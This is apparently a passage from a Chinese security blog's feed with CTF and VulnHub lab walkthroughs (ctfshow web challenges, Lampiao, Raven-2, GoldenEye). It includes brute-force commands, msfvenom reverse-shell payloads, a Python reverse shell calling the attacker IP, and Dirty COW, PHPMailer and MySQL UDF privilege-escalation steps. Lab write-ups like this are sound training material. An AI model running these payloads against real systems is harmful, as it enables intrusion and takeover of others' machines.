class="line">  <span class="keyword">if</span> (<span class="built_in">this</span>.username.equals(<span class="string">&quot;admin&quot;</span>) &amp;&amp; <span class="built_in">this</span>.password.equals(<span class="string">&quot;ctfshow&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>找到<code>/login</code>了, 可是访问还是404; 结果发现在<code>/ctfshow/login</code></p><p>最终url如下, 登录即可获取flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ctfshow/login?username=admin&amp;password=ctfshow</span><br></pre></td></tr></table></figure><h2 id="web299"><a class="header-anchor" href="#web299">¶</a>web299</h2><ul><li>描述: 了解为主</li></ul><p>打开, 在源码里面发现``/view-source?file=index.php `, 可以读取文件</p><p>先试试读取<code>/view-source?file=/WEB-INF/web.xml</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">This is the description of my J2EE component This is the display name of my J2EE component ViewSourceServlet com.ctfshow.servlet.ViewSourceServlet This is the description of my J2EE component This is the display name of my J2EE component GetFlag com.ctfshow.servlet.GetFlag ViewSourceServlet /view-source GetFlag /getFlag index.jsp</span><br></pre></td></tr></table></figure><p><code>com/ctfshow/servlet/GetFlag</code>下, 结合常见的文件框架, 那就是<code>/view-source?file=WEB-INF/classes/com/ctfshow/servlet/GetFlag.class</code></p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240921212805005.png" alt="image-20240921212805005"></p><p>有个<code>/fl3g</code>, 反正什么都试试</p><h2 id="web300"><a class="header-anchor" href="#web300">¶</a>web300</h2><ul><li>描述: java 告一段落</li></ul><p>你这是真的java还是假的java?</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 10:52:43</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-16 10:54:20</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件包含?其实就是web299翻版, 直接照着web299走, 换个网址就行了; payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?file=../../../../../f1bg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> ctfshow靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> RCE </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Lampiao-1</title>
      <link href="/article/Lampiao-1/"/>
      <url>/article/Lampiao-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Lampiao</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/lampiao-1,249/">vulnhub靶场-Lampiao:1</a></p><p>目标: Get root!</p><p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.6</p><p>ubuntu: 192.168.56.7</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -p- 192.168.56.7</span><br><span class="line">nmap -A 192.168.56.7</span><br></pre></td></tr></table></figure><p>可以得到详细的信息:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp</span><br><span class="line">OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.7 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/http?</span><br><span class="line">静态界面</span><br><span class="line">1898/http</span><br><span class="line">登录界面</span><br><span class="line">Apache/2.47(Ubuntu)</span><br></pre></td></tr></table></figure><p>扫描80目录无收获, 扫描1898目录, 有很多路径泄露, 不过没什么用, 仅仅得到了cms是<code>Drupal 7.54, 2017-02-01</code></p><p>结合页面公告, 得知有一个用户是<code>tiago</code></p><p>利用kali工具爬取该网站存在的密码, 看看能不能爆破登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cewl http://182.168.56.7:1898 -w pc.txt</span><br></pre></td></tr></table></figure><p>结果网站存在登录限制, 没有邮箱的前提下, 密码也找回不了, 而且注册也注册不了</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916135812689.png" alt="image-20240916135812689"></p><p>这条路子算是废了, 试试其他方面</p><p>在Read more中, url出现<code>/?q=node/1</code>, 尝试修改后面的数字看有没有类似注入点的地方</p><p>当访问<code>/?q=node/2</code>, 返回了2个文件和一个提示:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916144425053.png" alt="image-20240916144425053"></p><p>音频内容为: user,tiago; 图片是二维码, 扫描结果为&quot;Try harder! muahuahua&quot;</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><blockquote><p>其实可以直接利用Drupal漏洞让msf上线, 放在最后附录了</p></blockquote><p>没有密码, 剩下能用的只有22端口, 尝试爆破(就用从网站上爬下来的密码):</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -l tiago -P pc.txt 192.168.56.7 ssh</span><br><span class="line">login: tiago   password: Virgulino</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916145346404.png" alt="image-20240916145346404"></p><p>利用爆破得到的账号密码顺利进入, 发现为低权限</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916145842655.png" alt="image-20240916145842655"></p><p>利用msf制作木马并反弹shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 制作木马</span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.56.6 lport=10000 -f elf -o shell.elf</span><br><span class="line"></span><br><span class="line"># 本地 开启http服务</span><br><span class="line">python3 -m http.server 7890</span><br><span class="line"># 靶机 下载并且运行</span><br><span class="line">wget http://192.168.56.6:7890/shell.elf</span><br><span class="line">chmod 777 shell.elf</span><br><span class="line">./shell.elf</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916151525584.png" alt="image-20240916151525584"></p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>先拿一些系统信息</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># Linux lampiao 4.4.0-31-generic #50~14.04.1-Ubuntu SMP Wed Jul 13 01:06:37 UTC 2016 i686 i686 i686 GNU/Linux</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># tiago</span></span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># 有gcc环境就容易的多</span></span><br><span class="line"><span class="comment"># 我做完了, 我收回这句话</span></span><br></pre></td></tr></table></figure><p><a href="https://wiki.96.mk/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/Linux/Linux%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2016-5195%EF%BC%89%E8%84%8F%E7%89%9BLinux%20%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/#3-exp">Linux本地提权漏洞</a>, 尝试之后发现CVE-2016-5195(脏牛漏洞)可行</p><blockquote><p>靶机gcc烂完了, 好多.c文件编译不了, 回来kali找了个cpp的脏牛</p><p>很急, 最后忍不住扒拉别人的wp才成功编译了这个cpp</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># kali</span><br><span class="line">searchsploit dirty</span><br><span class="line">locate linux/local/40847.cpp</span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/40847.cpp /home/kali/Desktop/working/40847.cpp</span><br><span class="line">python3 -m http.server 7890</span><br><span class="line"># 靶机</span><br><span class="line">wget http://192.168.56.6:7890/40847.cpp</span><br><span class="line">chmod 777 40847.cpp</span><br><span class="line">g++ -Wall -pedantic -o2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line">./dcow</span><br></pre></td></tr></table></figure><p>运行之后可以得到root的密码: dirtyCowFun</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916173405951.png" alt="image-20240916173405951"></p><p>直接进行一个登录, 然后到达root目录下找到flag, 拿到flag</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240916174455287.png" alt="image-20240916174455287"></p><h2 id="附录"><a class="header-anchor" href="#附录">¶</a>附录</h2><p>在msf直接搜索cms框架漏洞, 参数配置完成后可以直接getshell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search Drupal</span><br><span class="line"># unix/webapp/drupal_restws_exec和unix/webapp/drupal_drupalgeddon2均可</span><br><span class="line">use unix/webapp/drupal_drupalgeddon2</span><br><span class="line">set rport 1898</span><br><span class="line">set rhost 192.168.56.7</span><br><span class="line">set lhost 192.168.56.6</span><br><span class="line">set lport 4445</span><br><span class="line">run</span><br></pre></td></tr></table></figure><blockquote><p>但是似乎在后续步骤上出了问题,不能使用在<code>/tmp</code>下的dcow, 不过算了吧</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 爆破 </tag>
            
            <tag> 提权 </tag>
            
            <tag> msf </tag>
            
            <tag> 漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Raven-2</title>
      <link href="/article/Raven-2/"/>
      <url>/article/Raven-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>Raven2</h1><hr><blockquote><p>来源: <a href="https://www.vulnhub.com/entry/raven-2,269/">vulnhub靶场-Raven:2</a></p><p>目标: There are four flags to capture</p><p>妙妙工具: python -c ‘import pty; pty.spawn(“/bin/bash”)’</p></blockquote><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>kali: 192.168.56.6</p><p>Debian: 192.168.56.8</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>老三件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.56.0/24</span><br><span class="line">nmap -p- 192.168.56.8</span><br><span class="line">nmap -A 192.168.56.8 -p 22,80,111,33925</span><br></pre></td></tr></table></figure><p>端口 22,80,111,33925</p><p>系统信息: Linux 3.2 - 4.9 Debian 5</p><p>中间件: Apache-Web-Server 2.4.10, Bootstrap, PHPMailer 5.2.16</p><p>可能存在的漏洞: DS_Store found, 但是是扒拉源码的漏洞</p><p>扫描泄露的路径:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/vendor/</span><br><span class="line">/wordpress/wp-login.php</span><br><span class="line">/manual/index.html</span><br><span class="line">/.DS_Store</span><br></pre></td></tr></table></figure><p>稍微探索一下, 在<code>/vendor/PATH</code>路径下找到了flag1</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/vendor/</span><br><span class="line">flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125;</span><br></pre></td></tr></table></figure><p>博客的那个登录界面完全不能用了, 没有账号密码的情况下, 现在尝试利用中间件漏洞:</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p><code>CVE-2016-10033 命令执行漏洞</code>, 看的描述是 PHPMailer&lt; 5.2.18 都能用</p><p><a href="https://www.exploit-db.com/search?cve=2016-10033">选择你的exp</a>, 详情界面中的EDB-ID就是kali中对应的文件名, 搜索即可找到; 这里选的40974</p><blockquote><p>试了41962.sh和42221.py都试不出来, 很急</p><p>msf似乎有一个<code>exploit/multi/http/phpmailer_arg_injection</code>可以用, 我这里也是转移shell到msf上了</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit 40974</span><br><span class="line">locate php/webapps/40974.py</span><br><span class="line">cp /usr/share/exploitdb/exploits/php/webapps/40974.py /home/kali/Desktop/working/40974.py</span><br></pre></td></tr></table></figure><p>先赋予权限再编辑:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917165130405.png" alt="image-20240917165130405"></p><blockquote><p>我这里总是出问题, 文件名是backdoor就出错, 我也很奇怪</p></blockquote><p>运行成功结果如图, 说明已经写入, 监听设置的端口然后访问/backdoor.php即可拿到shell</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -lvnp 8888</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917165301103.png" alt="image-20240917165301103"></p><p>然后继续信息收集:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># 权限: www-data</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># 系统: Linux Raven 3.16.0-6-amd64 #1 SMP Debian 3.16.57-2 (2018-07-14) x86_64 GNU/Linux</span></span><br><span class="line">gcc -v</span><br><span class="line"><span class="comment"># gcc环境: 有</span></span><br><span class="line">service --status-all</span><br><span class="line"><span class="comment"># 其他服务: mysql</span></span><br><span class="line">ps -aux|grep mysql</span><br><span class="line"><span class="comment"># 权限为root</span></span><br></pre></td></tr></table></figure><p>在<code>/var/www/</code>发现flag2:</p><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917180558417.png" alt="image-20240917180558417"></p><p>利用find命令发现flag3:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find /var -name <span class="string">&quot;flag*&quot;</span></span><br><span class="line"><span class="comment"># /var/www/html/wordpress/wp-content/uploads/2018/11/flag3.png</span></span><br><span class="line"><span class="comment"># 直接访问网页即可, /wordpress/wp-content/uploads/2018/11/flag3.png</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917181119877.png" alt="image-20240917181119877"></p><p>从根目录开始find, 发现很多没有权限以及假的flag, 没用, 考虑提权:</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><p>结合开启的服务, 可以尝试利用mysql的udf提权; 账号密码一般在网站的配置文件中有:</p><p>比如<code>html/wordpress/wp-config.php</code>, 可以找到mysql账号密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root : R@v3nSecurity</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917184514940.png" alt="image-20240917184514940"></p><p>先看看能不能满足udf提权的需要, 可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pR@v3nSecurity</span><br><span class="line">select version();</span><br><span class="line"># 5.5.60-0+deb8u1</span><br><span class="line">show global variables like &#x27;secure%&#x27;;</span><br><span class="line"># secure_file_priv 为空才可以提权, 若为NULL和/tmp/等则不行, 此处为空</span><br><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line"># plugin 的值为空时不可提权, 此处为 /usr/lib/mysql/plugin/</span><br><span class="line">show variables like &#x27;version_compile_%&#x27;;</span><br><span class="line"># x86_64</span><br><span class="line">show databases;</span><br><span class="line"># wordpress</span><br><span class="line"># 另外, 因为禁止了远程登录, msf不能一把梭</span><br></pre></td></tr></table></figure><blockquote><p>利用条件:</p><ul><li>mysql允许导入导出文件</li><li>高权限用户启动，如root。该账号需要有对数据库<code>mysql</code>的insert和delete权限，其实是操作里面的<code>func</code>表，所以<code>func</code>表也必须存在。</li><li>未开启<code>‑‑skip‑grant‑tables</code>。开启的情况下，UDF不会被加载，默认不开启</li></ul></blockquote><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit mysql udf</span><br><span class="line"><span class="comment"># 省略复制到某文件夹的步骤, 下列步骤也在本地执行</span></span><br><span class="line">gcc -g -c 1518.c</span><br><span class="line">gcc -g -shared -o mysqludf.so 1518.o -lc</span><br><span class="line"><span class="comment"># 或者是 gcc -g -shared -Wl,-soname,1518.so -o mysqludf.so 1518.c -lc</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917195135879.png" alt="image-20240917195135879"></p><p>将文件上传到靶机, 进行后续操作:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use wordpress;</span><br><span class="line">create table shell(line blob);</span><br><span class="line"># 创建表</span><br><span class="line">insert into shell values(load_file(&#x27;/tmp/mysqludf.so&#x27;));</span><br><span class="line"># 插入二进制的mysqludf.so</span><br><span class="line">select * from shell into dumpfile &#x27;/usr/lib/mysql/plugin/mysqludf.so&#x27;;</span><br><span class="line"># 导出mysqludf.so</span><br><span class="line">create function do_system returns integer soname &#x27;mysqludf.so&#x27;;</span><br><span class="line"># 创建do_system自定义函数</span><br><span class="line">select * from mysql.func;</span><br><span class="line"># 检查函数是否有do_system</span><br><span class="line">select do_system(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br><span class="line"># 给find命令所有者的suid权限, 回显为0</span><br></pre></td></tr></table></figure><p>给予了suid权限就可以用find提权了, 看看是否为管理员权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find `<span class="built_in">which</span> find` -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br><span class="line"><span class="comment"># 返回root</span></span><br></pre></td></tr></table></figure><p>可以, 那就使用find命令来提权; 然后寻找flag4, 在<code>/root</code>目录下</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find . -exec /bin/sh \; -quit</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/4reexile/Misc_/main/images/md/image-20240917204835497.png" alt="image-20240917204835497"></p>]]></content>
      
      
      <categories>
          
          <category> vulnhub靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 提权 </tag>
            
            <tag> 漏洞利用 </tag>
            
            <tag> UDF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GoldenEye-1</title>
      <link href="/article/GoldenEye-1/"/>
      <url>/article/GoldenEye-1/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h1>GoldenEye:1</h1><hr><p>来源: <a href="https://www.vulnhub.com/entry/goldeneye-1,240/">vulnhub靶场-Goldeneye:1</a></p><h2 id="环境配置"><a class="header-anchor" href="#环境配置">¶</a>环境配置</h2><p>攻击机(kali): 192.168.56.6</p><p>靶机(ubuntu): 192.168.56.101</p><h2 id="信息收集"><a class="header-anchor" href="#信息收集">¶</a>信息收集</h2><p>我还是第一次看到nmap的<code>-A</code>会漏掉端口的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.56.101</span><br><span class="line">nmap -A 192.168.56.101</span><br><span class="line">nmap -p 55006,55007 -A 192.168.56.101</span><br></pre></td></tr></table></figure><p>详细信息如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">25/tcp    open  smtp</span><br><span class="line">80/tcp    open  http Apache/2.4.7</span><br><span class="line">55006/tcp open  ssl/pop3</span><br><span class="line">55007/tcp open  pop3</span><br></pre></td></tr></table></figure><p>访问80端口, 要求我们去<code>/sev-home/</code>去登录, 没有账号密码贸然爆破不可取, 遂翻找源代码</p><p>就只有一个<code>terminal.js</code>, 注释中透露了一些账号密码</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Boris, make sure you update your default password. </span></span><br><span class="line"><span class="comment">//My sources say MI6 maybe planning to infiltrate. </span></span><br><span class="line"><span class="comment">//Be on the lookout for any suspicious network traffic....</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//I encoded you p@ssword below...</span></span><br><span class="line"><span class="comment">//&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</span></span><br><span class="line"><span class="comment">//BTW Natalya says she can break your codes</span></span><br></pre></td></tr></table></figure><p>此处是ascii码, 对照表可以翻译为<code>InvincibleHack3r</code>, 至此可以得到账号密码:</p><blockquote><p>boris : InvincibleHack3r</p><p>natalya : null</p></blockquote><p>登录可以得到一段话, 这里只取部分, 结合扫描结果, 我们需要去对应端口看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Remember, since security by obscurity is very effective, we have configured our pop3 service to run on a very high non-default port</span><br></pre></td></tr></table></figure><p>需要登录, 但是我们并不知道boris的默认密码和natalya的密码, 那只能尝试爆破了:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo -e &#x27;natalya\nboris&#x27; &gt; test.txt</span><br><span class="line">hydra -L test.txt -P /usr/share/wordlists/fasttrack.txt 192.168.56.101 -s 55007 pop3</span><br></pre></td></tr></table></figure><p>这个字典是自带的, 跑的比较快, 虽然用自己的也能跑出来</p><p>我们得到pop3登录账密:</p><blockquote><p>boris : secret1!</p><p>natalya : bird</p></blockquote><p>利用telnet或者nc登录</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">telnet 192.168.56.101 55007</span><br><span class="line"># 或者 nc 192.168.56.101 55007</span><br><span class="line">user boris</span><br><span class="line">pass secrct1!</span><br><span class="line">list</span><br><span class="line">retr 1</span><br><span class="line"># 参数1-3</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905121111449.png" alt="image-20240905121111449"></p><p>在boris的邮件3中我们可已得到以下信息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Place them in a hidden file within the root directory of this server</span><br><span class="line"># 服务器root路径下有一个access codes</span><br><span class="line">Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal</span><br><span class="line">codes we will push to our final stages</span><br><span class="line"># 可能有一个新的用户xenia, 而且可能有更多的权限(推向最后阶段)</span><br></pre></td></tr></table></figure><p>在natalya的邮件2中可得:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username:xenia</span><br><span class="line">password:RCP90rulez!</span><br><span class="line">And if you didn’t have the URL on outr internal Domain: severnaya-station.com/gnocertdir</span><br><span class="line">Make sure to edit your host file since you usually work remote off-network…</span><br><span class="line">Since you’re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.</span><br><span class="line"># 我们需要修改host文件然后访问 severnaya-station.com/gnocertdir</span><br></pre></td></tr></table></figure><p>修改hosts文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br><span class="line">192.168.56.101 severnaya-station.com    </span><br></pre></td></tr></table></figure><p>去<code>severnaya-station.com/gnocertdir</code>利用账密登录, 可以找到一个欢迎信息来自Doak</p><p>而在<code>My profile -&gt; Messages</code>可以找到Dr. Doak的信件, 可以得到一个邮箱的用户名为doak, 没有密码就爆破</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905143437642.png" alt="image-20240905143437642"></p><p>登录邮件系统可以得到新的账号密码: <code>dr_doak : 4England!</code></p><p>拿去登录网站, 可以在<code>My profile-&gt;My private files</code>的for james文件夹中找到s3cret.txt, 可以下载下来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here.</span><br><span class="line"></span><br><span class="line">Something juicy is located here: /dir007key/for-007.jpg</span><br></pre></td></tr></table></figure><p>暗示admin的密码在新的路径: <code>/dir007key/for-007.jpg</code>, 是个图片, 那大概率是藏了什么</p><p>在属性界面找到了base64编码, 解码出来是<code>xWinter1995x!</code>, 那么这个就是管理员的密码了</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905150434809.png" alt="image-20240905150434809"></p><p>成功进入有权限的后台, 下一步就是getshell了</p><h2 id="getshell"><a class="header-anchor" href="#getshell">¶</a>getshell</h2><p>写马或者利用框架漏洞拿到服务器的shell</p><p>网站框架为moodle, msf有现成的利用模块, 也可以手工利用</p><blockquote><p>我的msf不是很好用捏</p><p>payload导入有些麻烦</p></blockquote><p>首先更改设置:</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905174027958.png" alt="image-20240905174027958"></p><p>然后在配置中写入反弹shell代码:</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.56.6&quot;,10000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905175441537.png" alt="image-20240905175441537"></p><p>先利用nc监听端口, 然后找到一个能发送数据包出去的地方, 能发送邮件的地方就不错, 点击那个钩就行了</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905175852742.png" alt="image-20240905175852742"></p><p>成功后执行<code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code>开一个新的交互shell</p><h2 id="提权"><a class="header-anchor" href="#提权">¶</a>提权</h2><blockquote><p>因为要进入root文件夹, 只能提权</p></blockquote><p>先查看服务器有哪些东西</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">whoami</span></span><br><span class="line"><span class="comment"># www-data</span></span><br><span class="line"><span class="built_in">uname</span> -a</span><br><span class="line"><span class="comment"># Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span></span><br></pre></td></tr></table></figure><p>没有gcc环境, 但是有cc环境</p><p>查看内核并查找对应的提权方法/漏洞, 找到37292.c, 复制下来准备编译</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 网络搜索:  Linux ubuntu 3.13.0-32 exploit</span></span><br><span class="line"><span class="comment"># 或者kali查找脚本: </span></span><br><span class="line">searchsploit ubuntu 3.13</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905182736391.png" alt="image-20240905182736391"></p><p>由于目标主机没有gcc环境, 这里需要改我们复制下来的脚本: 将第143行的gcc改为cc</p><blockquote><p>直接输入143gg就会跳转到143行</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905183320128.png" alt="image-20240905183320128"></p><p>然后开启http服务让靶机下载改过的文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># kali</span></span><br><span class="line">python3 -m http.server 6789</span><br><span class="line"><span class="comment"># 靶机</span></span><br><span class="line">wget http://192.168.56.6:6789/37292.c</span><br><span class="line">cc -o exp 37292.c</span><br><span class="line"><span class="built_in">chmod</span> +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905184209668.png" alt="image-20240905184209668"></p><p>可以看到是成功提权, 在<code>.flag.txt</code>找到了codes和flag地址, 访问即可得到flag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Alec told me to place the codes here: </span><br><span class="line"></span><br><span class="line">568628e0d993b1973adc718237da6e93</span><br><span class="line"></span><br><span class="line">If you captured this make sure to go here.....</span><br><span class="line">/006-final/xvf7-flag/</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240905184627870.png" alt="image-20240905184627870"></p><h2 id="附录"><a class="header-anchor" 